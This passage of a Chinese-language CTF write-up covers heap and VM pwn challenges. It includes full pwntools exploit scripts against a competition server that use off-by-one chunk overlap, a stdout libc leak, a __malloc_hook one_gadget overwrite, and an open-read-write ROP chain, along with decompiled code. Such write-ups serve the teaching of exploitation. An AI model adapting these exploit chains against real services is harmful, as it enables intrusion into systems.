         p = remote('101.200.53.148', 15423)
     def add(num, size, content):
         p.sendlineafter(">> ", "1")
         p.sendlineafter("please answer the question", str(num))
         p.sendlineafter('______?', str(size))
         p.sendlineafter("start_the_game,yes_or_no?", content)
     def delete(idx):
         p.sendlineafter(">> ", "2")
         p.sendlineafter("index ?", str(idx))
     def edit(idx, content):
         p.sendlineafter(">> ", "4")
         p.sendlineafter("index ?", str(idx))
         p.sendafter("__new_content ?", content)
     main_arena_offset = 0x3c4b20
     __malloc_hook_offset = libc.sym["__malloc_hook"]
     one_gadget_offset = 0xf1207
     while True:
         try:
             add(80, 0x28, "AAAA") # chunk 0
             add(80, 0x28, "BBBB") # chunk 1
             add(80, 0x28, "CCCC") # chunk 2
             for i in range(4):
                 add(80, 0x68, "DDDD") # chunk 3 4 5 6
             delete(3)
             # chunk overlap
             delete(2)
             delete(0)
             edit(0, '\x10')
             add(80, 0x28, "DDDD") # chunk 7
             edit(7, (p64(0) + p64(0x31)) * 2)
             add(80, 0x28, "EEEE") # chunk 8
             edit(8, p64(0) * 3 + p64(0xd1))
             # unsorted bin
             delete(1)
             add(80, 0x58, "FFFF") # chunk 9
             # bruteforce 4 bits
             edit(3, "\xdd\x55")
             add(80, 0x68, "GGGG") # chunk 10
             # leak
             add(80, 0x68, "HHHH") # chunk 11
             edit(11, "\x00" * 0x33 + p64(0xfbad1800) + p64(0) * 3 + "\x00")
             p.recvline()
             p.recv(0x40)
             libc_base = u64(p.recv(8)) - 0x3c5600
             __malloc_hook = libc_base + __malloc_hook_offset
             one_gadget = libc_base + one_gadget_offset
             break
         except:
             print("failed")
             p.close()
             p = remote('101.200.53.148', 15423)
             # p = process(argv=[_proc], env=_setup_env())
     print("success")
     edit(11, p64(libc_base + main_arena_offset + 0x58) * 2)
     # uaf
     add(80, 0x68, "AAAA") # chunk 12
     delete(12)
     edit(12, p64(__malloc_hook - 0x23))
     add(80, 0x68, "BBBB") # chunk 13
     add(80, 0x68, "CCCC") # chunk 14
     edit(14, '\x00' * 0x13 + p64(one_gadget))
     # trigger
     p.sendlineafter(">> ", "1")
     p.sendlineafter("please answer the question", str(80))
     p.sendlineafter('______?', str(0x38))
     success("libc_base: " + hex(libc_base))
     success("one_gadget: " + hex(one_gadget))
     p.sendline(token)
     p.interactive()
###  easybox
思路和上一题一样。
  1. 两个功能： 
    * `add`： 
                  unsigned __int64 add()
          {
                unsigned __int64 v1; // [rsp+8h] [rbp-18h]
                unsigned __int64 size; // [rsp+10h] [rbp-10h]
                unsigned __int64 v3; // [rsp+18h] [rbp-8h]
                v3 = __readfsqword(0x28u);
                puts("idx:");
                v1 = choice();
                if ( v1 > 0xF )
                {
                  puts("error.");
                  exit(1);
                }
                puts("len:");
                size = choice();
                if ( size > 0xFFF )
                {
                  puts("error.");
                  exit(1);
                }
                chunk_size[v1] = size + 1;
                chunk_array[v1] = malloc(size);
                puts("content:");
                read(0, chunk_array[v1], chunk_size[v1]);
                return __readfsqword(0x28u) ^ v3;
          }
直接就是一个off by one。
    * `delete`： 
                  unsigned __int64 delete()
          {
            unsigned __int64 v1; // [rsp+0h] [rbp-10h]
            unsigned __int64 v2; // [rsp+8h] [rbp-8h]
            v2 = __readfsqword(0x28u);
            puts("idx:");
            v1 = choice();
            if ( v1 > 0xF || !chunk_array[v1] )
            {
              puts("error.");
              exit(1);
            }
            free(chunk_array[v1]);
            chunk_array[v1] = 0LL;
            chunk_size[v1] = 0LL;
            return __readfsqword(0x28u) ^ v2;
          }
删得很彻底。
  2. 直接利用off by one，构造chunk overlap，因为没有`show`，所以同样使得同一个chunk同时存在于unsorted bin和fastbin（`size = 0x70`）中，这样`fastbin->fd = main_arena + 0x58`；然后partial write，bruteforce，write stdout， leak。
  3. 然后再利用chunk overlap，fastbin attack打`__malloc_hook`为`onegadget`即可。
  4. exp仅供参考： 
         p = remote('101.200.53.148', 34521)
     def add(idx, len, content):
         p.sendlineafter(">>>", "1")
         p.sendlineafter("idx:", str(idx))
         p.sendlineafter("len:", str(len))
         p.sendafter("content:", content)
     def delete(idx):
         p.sendlineafter(">>>", "2")
         p.sendlineafter("idx:", str(idx))
     stdout_offset = 0x3c5620
     __malloc_hook_offset = libc.sym["__malloc_hook"]
     one_gadget_offset = 0xf1207
     while True:
         try:
             # chunk overlap
             add(0, 0x28, "AAAA")
             add(1, 0x28, "BBBB")
             delete(0)
             add(2, 0x68, "CCCC")
             delete(2)
             add(0, 0x28, "A" * 0x28 + "\xa1")
             add(3, 0x28, "DDDD")
             delete(1)
             # partial write
             add(1, 0x28, "B" * 0x28 + "\x61")
             delete(1)
             add(4, 0x58, p64(stdout_offset - 0x43)[:2])
             add(1, 0x28, "B" * 0x28 + "\x71")
             # leak
             add(5, 0x68, "EEEE")
             add(6, 0x68, "\x00" * 0x33 + p64(0xfbad1800) + p64(0) * 3 + "\x00")
             p.recvline()
             p.recv(0x40)
             libc_base = u64(p.recv(8)) - 0x3c5600
             __malloc_hook = libc_base + __malloc_hook_offset
             one_gadget = libc_base + one_gadget_offset
             break
         except:
             print("Failed")
             p.close()
             p = remote('101.200.53.148', 34521)
     print("Success")
     # chunk overlap
     add(7, 0x28, "AAAA")
     add(8, 0x28, "BBBB")
     delete(7)
     add(9, 0x68, "CCCC")
     delete(9)
     add(7, 0x28, "A" * 0x28 + "\xa1")
     add(10, 0x28, "DDDD")
     delete(8)
     # __malloc_hook
     add(8, 0x38, "E" * 0x28 + p64(0x71) + p64(__malloc_hook - 0x23))
     add(9, 0x68, "FFFF")
     add(11, 0x68, "G" * 0x13 + p64(one_gadget))
     # trigger
     p.sendlineafter(">>>", "1")
     p.sendlineafter("idx:", str(12))
     p.sendlineafter("len:", str(0x48))
     success("libc_base: " + hex(libc_base))
     success("__malloc_hook: " + hex(__malloc_hook))
     success("one_gadget: " + hex(one_gadget))
     p.sendline("token")
     p.interactive()
###  wow
主要就是逆向这个binary，搞清楚逻辑后难度就降低了。
  1. 主要就是程序在栈上开辟了一块0x400的地址作为虚拟栈，然后指令就是`~@#$^&|*{}`这几个，前面的几个很容易看出来就是对虚拟栈进行一些基本的操作，主要是后面这两个`{}`，队友说是像一些红黑树（实际上后来发现并不重要），重点在于： 
    * `{`和`}`可以理解为条件跳转指令，如果当前虚拟栈上的值不为0，那么`{}`中间的指令就会得到执行。
    * 执行到`}`的时候，同样检查虚拟栈上的值不为0的话，就会重新跳回`{`执行，相当于一个循环操作（这里可以解释为什么`~{}`指令会造成程序死循环了）。
  2. 之后在这个基础上，尝试输入一些payload，发现`~{@~}`会打印出”\xFF\xFF\xFF\xFF”（在没有aslr的情况下），由于程序中打印code用的就是一个`code_buf`指针，这里显然是指针被改了。
  3. 调试后发现，原因在于执行过程中，存在一个1 byte溢出，将虚拟栈后面的指针低字节给覆盖了，而这个指针，正好就是指向输入的指令；那么，此时相当于我们可以修改指令buf的位置，向栈上附近的位置写入任意值。
  4. 同时可以发现： 
         while ( 1 )
     {
         read(0LL, &tmp, 1LL);
         chr = tmp;
         if ( tmp == 10 )
               break;
         index = len;
         len_inc = len + 1;
         if ( code_buf == (__int64 *)&code )
               v11 = 15LL;
         else
               v11 = code;
         if ( len_inc > v11 )
              realloc(&code_buf, len, 0LL, 0LL, 1LL);
         *((_BYTE *)code_buf + index) = chr;
         len = len_inc;
         *((_BYTE *)code_buf + index + 1) = 0;
     }
这里因为`code_buf`被改了，造成`code_buf == (__int64
*)&code`没有满足，`v11`就被赋值为上一次输入的指令值了，也就是说就是一个很大的值，从而`realloc`不会因为指令的长度超过15而被调用从而将`code_buf`指向heap上。
  5. 因此，利用的思路就很清晰了，就是利用溢出将`code_buf`指向`return address`，然后写入orw的rop拿flag，但是需要注意的，避开地址包含有效指令的gadget（或者进行计算）。
  6. 这样rop打return address后发现还是会crash，其实程序还有个检查`code_buf`的位置： 
         if ( code_buf != (__int64 *)&code )
         sub_405C90((__int64)code_buf);
也就是说要绕过这个check，还必须将`code_buf`改回来，那么其实可以在rop的末尾添加指令改回来即可（因为解析指令的时候如果遇到非指令字符是会跳过的）。
  7. 改回来后再触发rop即可。
  8. `exp`仅供参考： 
         p = remote('101.200.53.148', 15324)
     syscall = 0x00000000004dc054 # syscall ; ret
     pop_rdi = 0x000000000041307a # pop rdi ; pop ...; ret
     pop_rsi = 0x000000000047383d # pop rsi ; pop ...; ret
     pop_rdx = 0x000000000053048b # pop rdx ; pop ...; ret
     pop_rax = 0x000000000053048a # pop rax ; pop ...; pop ...; ret
     def call(rax, rdi=0, rsi=0, rdx=0):
         return flat([pop_rax, rax, 0, 0, pop_rdi, rdi, 0, pop_rsi, rsi, 0, pop_rdx, rdx, 0, syscall])
     p.sendlineafter("enter your code:\n", "~{@&$}")
     p.send("A" * 0x3FF)
     p.recvuntil("\nrunning....\n")
     sleep(0.2)
     p.recvuntil("\x00" * 0x3FF)
     val = ord(p.recv(1))
     p.send(chr((val + 0x58) & 0xFF))
     p.sendafter("continue?", "Y")
     sleep(1)
     payload = call(0, 0, 0x5D3700, 0x10)
     payload += call(2, 0x5D3700, 0, 0)
     payload += call(0, 3, 0x5D3700 + 0x10, 0x50)
     payload += call(1, 1, 0x5D3700 + 0x10, 0x50)
     p.sendlineafter("enter your code:\n", payload + "~{@&$}")
     p.send("A" * 0x3FF)
     p.send(chr(val))
     p.sendafter("continue?", "N")
     p.send("/flag\x00"))
     p.interactive()